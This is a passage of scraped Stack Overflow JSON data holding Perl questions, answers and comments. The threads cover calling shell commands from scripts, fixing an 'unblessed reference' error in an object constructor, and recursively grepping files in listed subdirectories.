"profile_image": "https://www.gravatar.com/avatar/865a234d0e895cabe36edcc3e5e48d83?s=128&d=identicon&r=PG&f=1", "display_name": "Suzie", "link": "https://stackoverflow.com/users/6320360/suzie"}, "is_accepted": false, "score": 2, "last_activity_date": 1462986514, "creation_date": 1462986514, "answer_id": 37169148, "question_id": 37168778, "link": "https://stackoverflow.com/questions/37168778/is-it-a-good-practice-to-execute-terminal-commands-from-a-perl-php-script/37169148#37169148", "title": "Is it a good practice to execute terminal commands from a perl/ php script?", "body": "<p>Some operating system commands might have built-in functionality not available in language (perl's mkdir() lacks *ix mkdir's -p). Then again, something might be easier to do using languages constructs instead of parsing output (readdir() vs <code>ls</code>).</p>\n\n<p>And it is important to remember that something written in perl might be more portable to non-unix systems than calling os-specific external programs.</p>\n"}, {"tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 2, "last_activity_date": 1462988927, "creation_date": 1462988927, "answer_id": 37169931, "question_id": 37168778, "link": "https://stackoverflow.com/questions/37168778/is-it-a-good-practice-to-execute-terminal-commands-from-a-perl-php-script/37169931#37169931", "title": "Is it a good practice to execute terminal commands from a perl/ php script?", "body": "<p>It's a great<sup>*</sup> practice. Perl and PHP are great for lots of things, but they're not great at everything, and there's a use case for using external programs and other tools in your project. But one of things that Perl is definitely great at is gluing together input and output formats and letting you mash together several different tools into a single project, letting each part of the project do what they do best.</p>\n\n<p><sup>*</sup> by which I mean, often a great practice. Things like <code>@files=qx(ls $dir)</code> and <code>@txt=qx(cat $textfile)</code> make all right-thinking Perl programmers cringe.</p>\n"}, {"tags": [], "owner": {"reputation": 100758, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "is_accepted": true, "score": 4, "last_activity_date": 1462989325, "creation_date": 1462989325, "answer_id": 37170051, "question_id": 37168778, "link": "https://stackoverflow.com/questions/37168778/is-it-a-good-practice-to-execute-terminal-commands-from-a-perl-php-script/37170051#37170051", "title": "Is it a good practice to execute terminal commands from a perl/ php script?", "body": "<p>Yes, this is <strong>bad practice in almost all cases</strong>! This is especially true if you have a choice.</p>\n\n<p>Executing external commands is:</p>\n\n<ul>\n<li><p>Very <strong>hard to do correctly</strong> (but very easy to get sort-of-working). You can't just escape the shell args and call it a day, you have to account for potentially multiple levels of escaping for potentially different languages. </p></li>\n<li><p><strong>Slow</strong>. A fork+exec to e.g. <code>rm</code> is easily a thousand times slower than the corresponding syscall.</p></li>\n<li><p>A <strong>rigid, error-prone and inexpressive</strong> integration point. You typically have to convert data to flat lists of strings and back. You can't use the language's features like exception handling, nested data structures or callbacks. </p></li>\n</ul>\n\n<p>Due to this, the following are <strong>BAD reasons</strong> to call external commands:</p>\n\n<ul>\n<li><p>Not knowing how to do X in your language, but knowing a shell command for it. A typical example is <code>cp -R foo bar</code>. </p></li>\n<li><p>Not knowing how something works, but knowing a shell oneliner that does it. A typical example is <code>foo *.mp4 &gt; &gt;(tee file)</code>. </p></li>\n<li><p>Not wanting to learn a new API for e.g. json or http, and instead using shell tools like <code>jq</code> or <code>curl</code>.</p></li>\n</ul>\n\n<p>However, if you are calling a program that does non-trivial things, that doesn't have a native library or bindings, AND that you know how to invoke with <code>execve</code> semantics (NOT <code>system</code> nor perl <code>exec</code> semantics that invoke shells), this is a valuable tool. </p>\n\n<p>Examples of good uses of executing external commands that follow all the above is invoking <code>make</code> to build a project from an installer, or running <code>java -jar ...</code> to start a Minecraft server.</p>\n"}], "owner": {"reputation": 28, "user_id": 4824592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/057d6cd2d886376efe1e1ff912042c0d?s=128&d=identicon&r=PG&f=1", "display_name": "saisrinivas", "link": "https://stackoverflow.com/users/4824592/saisrinivas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 304, "favorite_count": 0, "closed_date": 1462989319, "accepted_answer_id": 37170051, "answer_count": 4, "score": -1, "last_activity_date": 1462989325, "creation_date": 1462985300, "question_id": 37168778, "link": "https://stackoverflow.com/questions/37168778/is-it-a-good-practice-to-execute-terminal-commands-from-a-perl-php-script", "closed_reason": "Duplicate", "title": "Is it a good practice to execute terminal commands from a perl/ php script?", "body": "<p>Like executing a command using backticks or <code>exec()</code> or <code>system()</code>.</p>\n"}, {"tags": ["perl", "subroutine"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462986157, "post_id": 37168323, "comment_id": 61872959, "body": "You can&#39;t have the same functionality since one method returns an object and one returns a string. I assume you mean that you want <code>new</code> to return an object with an attribute set to that string, correct? In which case you can just move the logic from <code>message</code> into <code>new</code>."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462986925, "post_id": 37168323, "comment_id": 61873413, "body": "<code>$self-&gt;template</code> means call the <code>template</code> method on object <code>$self</code>. <code>$self</code> is not an object and I see no <code>template</code> function anywhere. What exactly are you trying to do with that line?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462987112, "post_id": 37168323, "comment_id": 61873531, "body": "I think you want something like <code>$self-&gt;{message} = sprintf $self-&gt;{template}, map ...</code>"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462987163, "post_id": 37168323, "comment_id": 61873564, "body": "Also, the first <code>return</code> is redundant, you can get rid of it."}, {"owner": {"reputation": 169, "user_id": 6000354, "user_type": "registered", "accept_rate": 81, "profile_image": "https://graph.facebook.com/1122424037792331/picture?type=large", "display_name": "Paul Russell", "link": "https://stackoverflow.com/users/6000354/paul-russell"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462987758, "post_id": 37168323, "comment_id": 61873922, "body": "Aw yeah, I understand that. Okay thanks. :)"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463156651, "post_id": 37168323, "comment_id": 61961142, "body": "Your question has morphed into a totally different question, so you should make a new post. Good rule of thumb: if somebody has invested time writing an answer, don&#39;t edit your question to the point that the answer no longer addresses the question. Posting lots of questions is fine, as long as they&#39;re actually different questions."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463156711, "post_id": 37168323, "comment_id": 61961177, "body": "Also, &quot;Use of uninitialized value in sprintf&quot; is not the same error you had before."}], "answers": [{"comments": [{"owner": {"reputation": 169, "user_id": 6000354, "user_type": "registered", "accept_rate": 81, "profile_image": "https://graph.facebook.com/1122424037792331/picture?type=large", "display_name": "Paul Russell", "link": "https://stackoverflow.com/users/6000354/paul-russell"}, "edited": false, "score": 0, "creation_date": 1463049306, "post_id": 37169714, "comment_id": 61901671, "body": "Yeah I had it outside the for loop. I&#39;m still getting the same error though . hmmm...."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 169, "user_id": 6000354, "user_type": "registered", "accept_rate": 81, "profile_image": "https://graph.facebook.com/1122424037792331/picture?type=large", "display_name": "Paul Russell", "link": "https://stackoverflow.com/users/6000354/paul-russell"}, "edited": false, "score": 0, "creation_date": 1463063667, "post_id": 37169714, "comment_id": 61912757, "body": "See my latest edit. You forgot the curly braces in <code>$self-&gt;context</code>. Remember, <code>$object-&gt;foo</code> (no curlies) calls method <code>foo</code>, while <code>$hashref-&gt;{foo}</code> (with curlies) accesses key <code>foo</code> in a hash reference."}], "tags": [], "owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "is_accepted": false, "score": 2, "last_activity_date": 1463063526, "last_edit_date": 1463063526, "creation_date": 1462988235, "answer_id": 37169714, "question_id": 37168323, "link": "https://stackoverflow.com/questions/37168323/trying-to-make-one-method-put-message-method-inside-new-method-in-perl/37169714#37169714", "title": "Trying to make one method. Put message method inside new method in perl", "body": "<p>You get the error</p>\n\n<blockquote>\n  <p>Can't call method \"foo\" on unblessed reference</p>\n</blockquote>\n\n<p>when you try to call a method on something that's not an object. For example:</p>\n\n<pre><code>my $h = {}; # hashref, not an object\n$h-&gt;foo;\n</code></pre>\n\n<hr>\n\n<p>The line</p>\n\n<pre><code>$self-&gt;template, map{ $self-&gt;{args}-&gt;{$key} } @{ $self-&gt;context };\n</code></pre>\n\n<p>tries to call the method <code>template</code> on the object <code>$self</code>, but</p>\n\n<ul>\n<li><code>$self</code> is not an object (it's a hash reference)</li>\n<li><code>template</code> is not a method (it's a hash key)</li>\n<li>you don't assign the result to anything</li>\n</ul>\n\n<p>You have the same issue with <code>$self-&gt;context</code>, which tries to call the non-existent method <code>context</code> on <code>$self</code>.</p>\n\n<p>To populate your template and assign it to an attribute of your object, do:</p>\n\n<pre><code>my @template_args = map { $self-&gt;{args}-&gt;{$_} } @{ $self-&gt;{context} };\n$self-&gt;{message} = sprintf( $self-&gt;{template}, @template_args );\n</code></pre>\n\n<p>You should do this outside of the <code>foreach</code> loop because you only need to evaluate the template once.</p>\n"}], "owner": {"reputation": 169, "user_id": 6000354, "user_type": "registered", "accept_rate": 81, "profile_image": "https://graph.facebook.com/1122424037792331/picture?type=large", "display_name": "Paul Russell", "link": "https://stackoverflow.com/users/6000354/paul-russell"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463158730, "creation_date": 1462983879, "last_edit_date": 1592644375, "question_id": 37168323, "link": "https://stackoverflow.com/questions/37168323/trying-to-make-one-method-put-message-method-inside-new-method-in-perl", "title": "Trying to make one method. Put message method inside new method in perl", "body": "<p>Below are two method which work in conjunction to output and error message. I want to find a way to have the same functionality but reduce it to one method.</p>\n<pre><code># Method for creating error message\n  sub new {\n      my ( $class, $error, %args ) = @_;\n      # Initialize error with data\n      my $self = $error;\n      # If the error contains context parameters... Insert parameters into string template\n      foreach my $key (@{ $self-&gt;{context} } ) {\n          \n          # And take the ones we need\n          $self-&gt;{args}-&gt;{$key} = $args{$key};\n      }\n      return bless $self, $class;\n  }\n\n    # Method which inserts variables into template hash field from the error hash structure\n \n\n  sub message {\n        my ($self) = @_;\n        return sprintf $self-&gt;template,\n                 map { $self-&gt;args-&gt;{$_} } @{ $self-&gt;context };\n  }\n</code></pre>\n<p>Here is Type.pm ; where my error hash structures are located.</p>\n<pre><code> UNABLE_TO_PING_SWITCH_ERROR =&gt; {\n         category =&gt; 'Connection Error',\n         template =&gt; &quot;Could not ping switch %s in %s seconds.&quot;,\n         context =&gt; [ qw(switch_ip  timeout) ],\n         tt =&gt; {template =&gt; 'disabled'},\n         fatal =&gt; 1,\n         wiki_page =&gt; 'www.error-fix-link.com/',\n     },\n</code></pre>\n<p>Each field in the error hash contains a getter.</p>\n<p>Any help would be much appreciated. If more information is needed just comment below. Thanks</p>\n<h1>Update:</h1>\n<p>This is the way I was trying to go, but I am getting an error saying I can use method 'template' on an unblessed reference. What I want to do is make message an element/attribute of the object created by the new() method. If that makes sense?</p>\n<pre><code># Method for creating error message\n  sub new {\n      my ( $class, $error, %args ) = @_;\n      # Initialize error with data\n      my $self = $error;\n      # If the error contains context parameters... Insert parameters into string template\n      if(%args) {\n          foreach my $key (@{ $self-&gt;{context} } ) {\n              # And take the ones we need\n              $self-&gt;{args}-&gt;{$key} = $args{$key};\n              # map/insert arguments into context hash and insert into string template\n              $self-&gt;template, map{ $self-&gt;{args}-&gt;{$key} } @{ $self-&gt;context };\n\n          }\n          # message var maps the parameters the message string (template)\n          return bless $self, $class;\n      }\n      return bless $self, $class;\n  }\n</code></pre>\n"}, {"tags": ["perl", "grep"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1462983581, "post_id": 37168126, "comment_id": 61871480, "body": "Can you please copy and paste the actual text from your screenshot into the question? You should avoid screenshots of text because they&#39;re not searchable, they&#39;re not accessible to people with disabilities, and they force people to manually re-type your data to test it."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 3, "creation_date": 1462984206, "post_id": 37168126, "comment_id": 61871846, "body": "Inlining your sub in the middle of your code is dirty. Don&#39;t do that."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1462984581, "post_id": 37168126, "comment_id": 61872067, "body": "Schwern gave you such a nice hint on how to <a href=\"http://stackoverflow.com/questions/37149051/perl-output-still-only-one-line#comment61836413_37149051\">indent code properly</a>. Please pay attention to it."}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462984667, "post_id": 37168126, "comment_id": 61872123, "body": "@ThisSuitIsBlackNot Thanks guys! Just made some changes based on the previous input."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1462984703, "post_id": 37168126, "comment_id": 61872158, "body": "<code>perltidy -pbp</code> is a pretty good start. And so very easy."}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 1, "creation_date": 1462985529, "post_id": 37168126, "comment_id": 61872603, "body": "Thanks! Just cleaned it up with perltidy :)"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462987784, "post_id": 37168126, "comment_id": 61873941, "body": "Please can you show us what&#39;s in <code>clst1.csv</code>? You split each line into <code>@pairs</code> and then iterate over each element of that array, but you then do <code>find( \\&amp;Matches, &quot;$dir&#47;$c1&quot; )</code> which is the same every time and independent of the value from the array. That can&#39;t be right. I&#39;m also unclear why you&#39;re using <code>File::Find</code> if the locations of all the <code>pairsAngles.txt</code> files are in the clusters file"}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462991122, "post_id": 37168126, "comment_id": 61875955, "body": "@Borodin All the pairsAngles.txt are in subdirectories, and each of the subdirectories has a unique name. I first read all the subdirectory names from the csv file and split them into an array, then retrieve every element from that array to get into a subdirectory so that I can grep.  clst1.csv has only one column, which is the subfolder names: oligomerAngle-1h2s-000_001-0003_0025_A-0034_0056_A-B004A012  oligomerAngle-5ax0-000_001-0010_0036_A-0042_0064_A-B004A013  oligomerAngle-4qnd-004_005-0046_0065_A-0069_0091_A-A004B006  oligomerAngle-2j8c-003_004-0171_0196_L-0226_0250_L-B011A001.&zwnj;&#8203;.."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462992882, "post_id": 37168126, "comment_id": 61876905, "body": "Does a line in <code>$cluster</code>, read with <code>while ( $c1 = &lt;$in&gt; )</code>, have:  (1) a name of a directory in which the file is, OR (2) a long string which has names of <i>subdirectories</i>, separated by spaces, where each of these <i>subdirectories</i> has the file?"}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462993066, "post_id": 37168126, "comment_id": 61877019, "body": "@zdim It has the full name of a subdirectory:  oligomerAngle-3wu2-033_034-0004_0027_z-0034_0059_z-B010A004"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462993590, "post_id": 37168126, "comment_id": 61877306, "body": "And that&#39;s it?  Just that one string on the line, and the file is right inside of that subdirectory? So the exact path to your file is <code>$dir&#47;oligomer...&#47;pairsAngles.txt</code>, where <code>oligomer...</code> subdirectories are listed one per line in <code>$cluster</code>?"}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462993844, "post_id": 37168126, "comment_id": 61877435, "body": "@zdim yes! Originally there were more columns and I used split to get that one column. Then I cleared up the file and made a separate csv file which only contains the names of the subdirectories."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462995335, "post_id": 37168126, "comment_id": 61878235, "body": "Ah. It would&#39;ve helped a lot having this information in the post, this now apears far simpler."}], "answers": [{"comments": [{"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462989363, "post_id": 37169758, "comment_id": 61874951, "body": "The subdirectories are named after the subunits and helices of different proteins and each one is unique. I have over 2500 subdirectories and I need to grep Distance from the txt file under roughly 2000 of them based on the csv file, which contains only those protein structures that I&#39;m interested in. I couldn&#39;t think of another way to do it using Perl..."}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462990927, "post_id": 37169758, "comment_id": 61875861, "body": "print &quot;next finding in $dir/$c1\\n&quot; worked perfectly and gave me a complete, non-redundant list of all the subdirectories that I want."}, {"owner": {"reputation": 41, "user_id": 6320360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/865a234d0e895cabe36edcc3e5e48d83?s=128&d=identicon&r=PG&f=1", "display_name": "Suzie", "link": "https://stackoverflow.com/users/6320360/suzie"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 1, "creation_date": 1462994293, "post_id": 37169758, "comment_id": 61877663, "body": "Make a test copy of your clst1.csv, with only one line. How many items will what line have? How many times will while() loop run? How many times will foreach() loop? What will be values of $pair on each foreach. <b>Important: How will you use $pair?</b>"}], "tags": [], "owner": {"reputation": 41, "user_id": 6320360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/865a234d0e895cabe36edcc3e5e48d83?s=128&d=identicon&r=PG&f=1", "display_name": "Suzie", "link": "https://stackoverflow.com/users/6320360/suzie"}, "is_accepted": false, "score": 0, "last_activity_date": 1462988368, "creation_date": 1462988368, "answer_id": 37169758, "question_id": 37168126, "link": "https://stackoverflow.com/questions/37168126/recursive-subdirectory-grep/37169758#37169758", "title": "Recursive subdirectory grep", "body": "<ul>\n<li><p>Your data structure is a bit odd. Instead of naming files with meaningful names they are all named same and buried in subdirectories. Why are directories listed in .csv, are you supposed to skip some directories? Have you considered using a database?</p></li>\n<li><p>Move the sub out of your loop</p></li>\n<li><p>You do a find() on \"$dir/$c1\" where $c1 is something you can split() with spaces. This might be why you get repetitions. Try</p>\n\n<p>print \"next finding in $dir/$c1\\n\"</p></li>\n</ul>\n\n<p>before calling find() so you see what happens.</p>\n\n<ul>\n<li>I can't understand what you wanted to do, and reading the code makes me not wiser in this sense. Are you sure you know it yourself? Try first thinking <em>what</em> you want to do, instead of <em>how</em> you are doing it.</li>\n</ul>\n\n<p>Would something like</p>\n\n<pre><code>grep -r Distance directory\n</code></pre>\n\n<p>do?</p>\n"}, {"comments": [{"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462996338, "post_id": 37171703, "comment_id": 61878800, "body": "You rock!!! Just wondering how I can acquire this kind of intuition and way of thinking. I&#39;m really new to programming and it&#39;s been really frustrating... I&#39;ve read some tutorials but it seems practice is the key. But when I try to work on a project I feel so inadequate. Any advice?"}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462997861, "post_id": 37171703, "comment_id": 61879613, "body": "BTW, how can I grep two or more strings? Say, I want to grep Distance, Local angle, and Average angle. Don&#39;t think pipelines will work here."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1463001746, "post_id": 37171703, "comment_id": 61881664, "body": "@AvaXue Huh, thank you, but I disagree with the &#39;rock&#39;-ing part :). Learning programming ... yes, lots of practice; yes, lots of reading; and, yes, it will take some time.  However, you can make progress quite rapidly and get to a comfortable place in not too long.  It seems to me that you are doing really well, trying various things out and not shying away from challenge."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 1, "creation_date": 1463002420, "post_id": 37171703, "comment_id": 61881964, "body": "@AvaXue   I&#39;d emphasize one thing: make sure you work with proper resources so that you learn more than just how to write some code. By the problem subject I take it that your discipline isn&#39;t CS, so do as much as you can. It will take a little time but you can develop ability to write good software to do what you need. The more effort you put in the more of that you&#39;ll get :). If you can see that you will be doing programming for work regularly it is worth it.  Of course, don&#39;t let it distract you (too much) -- your chosen field needs your <i>full</i> attention."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 1, "creation_date": 1463003053, "post_id": 37171703, "comment_id": 61882239, "body": "@AvaXue Multiple patterns: if you want to find a line that contains either, then that&#39;s <i>regular expressions</i>.  You can write it to match either one thing or another, so you catch a line with &#39;Distance&#39; and the one with &#39;Local Angle ...&#39; etc.  See for example <a href=\"http://perldoc.perl.org/perlrequick.html\" rel=\"nofollow noreferrer\">perlrequick</a>.  Better yet, if you are 